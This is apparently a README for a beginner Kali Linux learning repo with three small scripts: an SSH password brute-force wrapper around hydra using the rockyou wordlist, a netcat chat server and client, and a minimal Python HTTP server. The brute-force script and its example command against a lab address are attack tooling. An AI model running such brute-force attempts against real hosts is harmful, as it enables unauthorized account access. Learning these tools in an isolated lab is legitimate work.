# Kali-Projects
# All-in-One Security & Networking Projects

This repo contains three easy beginner projects for learning basic networking and security concepts without needing internet access.

---

## Project 1: SSH Brute Force with Hydra

**Purpose:** Brute force SSH login passwords using `hydra`.

**Usage:**  
```bash
chmod +x hydra_bruteforce.sh
./hydra_bruteforce.sh <username> <target_ip> <wordlist>
Example:

bash
Copy
Edit
./hydra_bruteforce.sh root 192.168.56.10 /usr/share/wordlists/rockyou.txt
Code: hydra_bruteforce.sh

bash
Copy
Edit
#!/bin/bash

if [ $# -ne 3 ]; then
  echo "Usage: $0 <username> <target_ip> <wordlist>"
  exit 1
fi

USER=$1
TARGET=$2
WORDLIST=$3

echo "[*] Starting SSH brute force attack on $TARGET with user $USER"
hydra -l $USER -P $WORDLIST ssh://$TARGET
Project 2: Simple Chat with Netcat
Purpose: Create a basic chat server and client using netcat.

Usage:

Start server:

bash
Copy
Edit
./netcat_chat.sh server <port>
Start client:

bash
Copy
Edit
./netcat_chat.sh client <server_ip> <port>
Example:

bash
Copy
Edit
# On server machine
./netcat_chat.sh server 1234

# On client machine
./netcat_chat.sh client 192.168.56.10 1234
Code: netcat_chat.sh

bash
Copy
Edit
#!/bin/bash

if [ "$1" == "server" ]; then
  PORT=$2
  echo "[*] Starting netcat chat server on port $PORT..."
  nc -l -p $PORT
elif [ "$1" == "client" ]; then
  SERVER_IP=$2
  PORT=$3
  echo "[*] Connecting to chat server $SERVER_IP on port $PORT..."
  nc $SERVER_IP $PORT
else
  echo "Usage: $0 server <port> | client <server_ip> <port>"
  exit 1
fi
Project 3: Minimal Python HTTP Server
Purpose: Serve current directory files over HTTP on port 8080.

Usage:

bash
Copy
Edit
python3 simple_http_server.py
Open in browser or use curl:

cpp
Copy
Edit
http://<server_ip>:8080
Code: simple_http_server.py

python
Copy
Edit
from http.server import HTTPServer, SimpleHTTPRequestHandler

PORT = 8080

with HTTPServer(('', PORT), SimpleHTTPRequestHandler) as httpd:
    print(f"Serving HTTP on port {PORT}...")
    httpd.serve_forever()
